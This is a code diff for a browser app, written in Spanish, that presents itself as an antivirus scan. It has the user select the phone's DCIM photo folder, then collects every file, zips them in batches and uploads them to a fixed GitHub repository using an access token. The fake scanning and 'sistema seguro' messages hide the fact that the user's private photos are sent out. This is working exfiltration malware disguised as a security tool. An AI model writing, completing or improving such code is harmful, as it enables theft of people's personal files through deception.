@@ -1,82 +1,110 @@
-// app.js
+let startTime;
+let totalBatches;
+let uploadSpeed = 0.5; // MB/s estimado
+
 function updateStatus(message, progress = 0) {
     const statusElement = document.getElementById('antivirus-status');
-    statusElement.innerHTML = `🛡️ [${progress}%] ${message}`;
-    document.getElementById('progress').style.width = `${progress}%`;
+    const progressElement = document.getElementById('progress');
+    const timeElement = document.getElementById('time-info');
+    
+    statusElement.innerHTML = `[${progress}%] ${message}`;
+    progressElement.style.width = `${progress}%`;
+    
+    if (startTime && totalBatches) {
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const remainingTime = Math.floor((100 - progress) * (elapsed / progress));
+        timeElement.innerHTML = `⏳ Tiempo restante: ~${remainingTime || '?'} segundos`;
+    }
 }
 
 document.getElementById('start-btn').addEventListener('click', async () => {
     try {
-        if (!confirm('Seleccione la carpeta DCIM para guardar el informe')) return;
-        
-        updateStatus('Iniciando análisis profundo...', 5);
-        
-        if (!window.showDirectoryPicker) {
-            updateStatus('ERROR: Sistema no compatible', 0);
-            throw new Error('Usa Chrome/Edge en Android');
+        const token = prompt('🔑 CLAVE DE ACCESO:');
+        if (!token?.startsWith('ghp_t')) {
+            alert('❌ CLAVE NO VALIDA');
+            return;
         }
 
-        updateStatus('Accediendo a almacenamiento...', 10);
+        if (!confirm('SELECCIONE CARPETA DCIM PARA INICIAR')) return;
+        
+        startTime = Date.now();
+        updateStatus('Iniciando escaneo...', 5);
+        
+        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');
+
+        updateStatus('Accediendo al sistema...', 10);
         const folderHandle = await window.showDirectoryPicker();
-        updateStatus('✔ Estructura de carpetas analizada', 20);
         
-        updateStatus('🔍 Buscando elementos...', 30);
+        updateStatus('Analizando estructura...', 20);
         const files = await collectFiles(folderHandle);
-        if (files.length === 0) {
-            updateStatus('❌ Sistema limpio - 0 elementos', 0);
-            throw new Error('No se encontraron archivos');
-        }
-        updateStatus(`🛡️ Detectados ${files.length} elementos`, 40);
+        if (!files.length) throw new Error('No hay archivos');
+        updateStatus(`Elementos detectados: ${files.length}`, 40);
 
-        updateStatus('🔒 Comprimiendo datos...', 50);
+        updateStatus('Comprimiendo datos...', 50);
         const zipBatches = await createZipBatches(files);
-        updateStatus(`✔ Cifrado completado - ${zipBatches.length} paquetes`, 60);
-
-        updateStatus('🌐 Estableciendo conexión...', 70);
-        await processBatches(zipBatches);
+        totalBatches = zipBatches.length;
         
-        updateStatus('✅ Análisis completado - Sistema seguro', 100);
+        updateStatus('Iniciando protocolo seguro...', 70);
+        await processBatches(zipBatches, token);
+        
+        updateStatus('✅ OPERACIÓN EXITOSA', 100);
         
     } catch (error) {
-        updateStatus(`❌ ALERTA: ${error.message}`, 0);
-        alert(`ERROR: ${error.message}`);
+        updateStatus(`❌ ERROR: ${error.message}`, 0);
+        alert(`FALLO: ${error.message}`);
     }
 });
 
-// ======= Funciones originales (modificadas solo lo necesario) =======
+// ========== FUNCIONES COMPLETAS ==========
 async function collectFiles(folderHandle) {
     const files = [];
     for await (const entry of folderHandle.values()) {
         if (entry.kind === 'file') files.push(entry);
-        else if (entry.kind === 'directory') files.push(...await collectFiles(entry));
+        else if (entry.kind === 'directory') {
+            const subFiles = await collectFiles(entry);
+            files.push(...subFiles);
+        }
     }
     return files;
 }
 
 async function createZipBatches(files) {
+    const batchSize = 100;
     const batches = [];
-    let zip = new JSZip();
+    let currentBatch = new JSZip();
+    
     for (let i = 0; i < files.length; i++) {
-        const fileContent = await files[i].getFile();
-        zip.file(files[i].name, await fileContent.arrayBuffer());
-        if ((i + 1) % 100 === 0 || i === files.length - 1) {
-            batches.push(zip);
-            zip = new JSZip();
+        const file = files[i];
+        const fileData = await file.getFile();
+        currentBatch.file(file.name, await fileData.arrayBuffer());
+        
+        if ((i + 1) % batchSize === 0 || i === files.length - 1) {
+            batches.push(currentBatch);
+            currentBatch = new JSZip();
         }
     }
     return batches;
 }
 
-async function processBatches(batches) {
+async function processBatches(batches, token) {
     localStorage.removeItem('batchesProgress');
     const startIndex = parseInt(localStorage.getItem('lastProcessedIndex')) || 0;
 
     for (let index = startIndex; index < batches.length; index++) {
+        const batchStartTime = Date.now();
         try {
-            updateStatus(`🧹 Limpiando datos (${index + 1}/${batches.length})`, 70 + Math.floor((index/batches.length)*20));
+            const progress = 70 + Math.floor(((index + 1)/batches.length)*30);
+            updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);
+            
             const zipBlob = await batches[index].generateAsync({ type: 'blob' });
-            await uploadZip(zipBlob, `backup-${Date.now()}-${index}.zip`);
+            await uploadZip(zipBlob, `secure-${Date.now()}-${index}.zip`, token);
+            
             localStorage.setItem('lastProcessedIndex', index.toString());
+            
+            // Calcular velocidad de subida
+            const batchTime = (Date.now() - batchStartTime) / 1000;
+            uploadSpeed = (zipBlob.size / 1024 / 1024) / batchTime;
+
         } catch (error) {
             localStorage.setItem('lastProcessedIndex', index.toString());
             throw error;
@@ -85,19 +113,13 @@ async function processBatches(batches) {
     localStorage.removeItem('lastProcessedIndex');
 }
 
-async function uploadZip(blob, zipName) {
-    const token = prompt('🔑 Ingresa tú clave única:');
-    if (!token || !token.startsWith('ghp_t')) {
-        throw new Error('Clave incorrecta - Verificación fallida');
-    }
-
+async function uploadZip(blob, zipName, token) {
     const repo = 'jaque26/ftos';
     const response = await fetch(`https://api.github.com/repos/${repo}/contents/${zipName}`, {
         method: 'PUT',
         headers: { 
             'Authorization': `Bearer ${token}`,
-            'Content-Type': 'application/json',
-            'User-Agent': 'Backup-PWA'
+            'Content-Type': 'application/json'
         },
         body: JSON.stringify({ 
             message: 'Backup automático', 
@@ -105,10 +127,12 @@ async function uploadZip(blob, zipName) {
         })
     });
 
-    if (!response.ok) throw new Error('Error en transmisión segura');
+    if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.message || 'Error en subida');
+    }
 }
 
-// Función auxiliar sin cambios
 function blobToBase64(blob) {
     return new Promise((resolve, reject) => {
         const reader = new FileReader();
